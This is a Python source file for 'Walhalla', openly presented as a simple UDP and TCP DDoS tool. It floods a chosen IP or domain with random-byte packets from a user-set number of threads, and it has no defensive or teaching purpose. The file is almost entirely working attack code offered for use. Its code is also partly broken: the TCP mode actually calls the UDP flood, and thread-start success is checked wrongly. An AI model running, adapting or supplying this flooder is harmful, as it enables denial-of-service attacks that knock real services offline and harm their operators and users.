# Author: PiereLucas(Julian Huch)
# Walhalla - A simple Python udp and tcp ddos tool
# MIT License

# Modules
import os
import sys
import time
import socket
from threading import Thread
from colorama import Fore
from argparse import ArgumentParser

# Colors
GREEN = Fore.GREEN
RED = Fore.RED
CYAN = Fore.CYAN
RESET = Fore.RESET


class Dos():
    """
    Dos Class for the main dos functions
    """

    def size(self, buffer_size):
        """ Make bytes from the user given buffer size """

        size = os.urandom(min(65500, buffer_size))
        return size

    def tcp_flood(self, ip, port, buffer_size, thread_nr):
        """ TCP flood function """

        while True:
            try:
                data = self.size(buffer_size)
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                    print(CYAN + "Thread [{}] | Firing up [{}] to [{}]:[{}]".format(thread_nr, data, ip, port))
                    sock.connect((ip, port))
                    sock.send(data)
            except Exception:
                print(RED + "Error in TCP" + RESET)
                sys.exit(0)

    def udp_flood(self, ip, port, buffer_size, thread_nr):
        """ UDP flood function """

        while True:
            try:
                data = self.size(buffer_size)
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                    print(CYAN + "Thread [{}] | Firing up [{}] to [{}]:[{}]".format(thread_nr, data, ip, port))
                    sock.sendto(data, (ip, port))
            except Exception:
                print(RED + "Error in UDP" + RESET)
                sys.exit(0)

class Controller(Dos):
    """
    Controller Class to serve the right Arguments to Dos Class
    """

    def __init__(self):
        # Time
        self.lt = time.localtime()
        self.time_hm = time.strftime("%H:%M")

        # Banner
        self.version = "v1.0"
        self.banner_txt = time.strftime("""
                         _       __      ____          ____     
                        | |     / /___ _/ / /_  ____ _/ / /___ _
                        | | /| / / __ `/ / __ \/ __ `/ / / __ `/
                        | |/ |/ / /_/ / / / / / /_/ / / / /_/ / 
                        |__/|__/\__,_/_/_/ /_/\__,_/_/_/\__,_/  
                                         [-V-]
                             » A SIMPLE PYTHON DDOS TOOL «
                    Coded by PiereLucas | https://github.com/pierelucas
                    Date: %d.%m.%y      | Time: %H:%M
                    
            """, self.lt)

    def arguments(self):
        """ Argument Parser for user input """

        parser = ArgumentParser(description=self.banner_txt.replace("-V-", self.version))
        parser.add_argument("-t", "--target", dest="target_addr")
        parser.add_argument("-p", "--port", dest="port")
        parser.add_argument("-m", "--mode", dest="dos_mode")
        parser.add_argument("-a", "--amount", dest="amount")
        parser.add_argument("-bs", "--buffer-size", dest="buffer_size")
        args = parser.parse_args()
        _true = self.check_args(args)
        if _true:
            return args.target_addr, args.port, args.dos_mode, args.amount, args.buffer_size

    def check_args(self, args):
        """ Check from user given arguments """

        if args.target_addr and args.port and args.dos_mode and args.amount and args.buffer_size:
            try:
                args.port = int(args.port)
                args.buffer_size = int(args.buffer_size)
                return True
            except ValueError as ex:
                print("Wrong Value: ", ex)
                sys.exit(0)
        else:
            print("Use -h or --help for futher information")
            sys.exit(0)

    def get_fqdm(self, target_addr):
        """ Get Fully qualified domain name from the www.domain.com form"""

        try:
            target_ip = socket.gethostbyname(target_addr)
            return target_ip
        except socket.gaierror as ex:
            print("Please define target in IP or [www.domain.com] format :", ex)
            sys.exit(0)

    def threads(self, amount, dos_mode, target_ip, port, buffer_size, thread_nr=None):
        """ Threading function to give arguments to dos class and start multiple threads """

        if dos_mode == 'tcp':
            self.dos = lambda t, p, b, n: self.udp_flood(target_ip, port, buffer_size, thread_nr)
        elif dos_mode == 'udp':
            self.dos = lambda t, p, b, n: self.udp_flood(target_ip, port, buffer_size, thread_nr)
        for nr in range(int(amount)+1):
            thread = Thread(target=self.dos, args=(target_ip, port, buffer_size, nr))
            print(GREEN + "[{}] Starting Thread to target [{}]".format(thread, target_ip) + RESET)
            try:
                if thread.start():
                    print(GREEN + "MODE: [{}] THREAD: [{}] » Sucessfully started and sending packets with size [{}] to target [{}]".format(dos_mode, thread, buffer_size, target_ip) + RESET)
            except Exception:
                print(RED + "Error in [{}]".format(thread) + RESET)
                continue

    def run(self):
        """ Run function to start everything """

        target_addr, port, dos_mode, amount, buffer_size = self.arguments()
        target_ip = self.get_fqdm(target_addr)
        self.threads(amount, dos_mode, target_ip, port, buffer_size)

if __name__ == "__main__":
    cc = Controller()
    cc.run()
